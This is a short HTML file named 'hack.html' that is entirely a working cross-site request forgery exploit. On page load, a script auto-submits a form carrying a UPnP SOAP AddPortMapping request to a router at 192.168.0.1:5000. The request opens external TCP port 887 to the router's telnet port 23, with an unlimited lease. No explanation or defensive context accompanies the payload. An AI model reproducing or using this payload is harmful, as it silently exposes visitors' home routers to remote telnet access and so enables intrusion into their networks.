hack.html

<html>
    <form action="http://192.168.0.1:5000/Public_UPNP_C3" method="post" ENCTYPE="text/plain">
    <textarea id="1" name="1"><?xml version="1.0"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
    <SOAP-ENV:Body>
    .<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">
    <NewPortMappingDescription>hax3</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration><NewInternalClient>192.168.0.1</NewInternalClient><NewEnabled>1</NewEnabled><NewExternalPort>887</NewExternalPort><NewRemoteHost></NewRemoteHost><NewProtocol>TCP</NewProtocol><NewInternalPort>23</NewInternalPort>
    .</m:AddPortMapping>
    </SOAP-ENV:Body>
    </SOAP-ENV:Envelope>&lt;/textarea&gt;
    <input type="submit" >
    </form>
    <script> document.forms[0].submit();</script>
</html>  
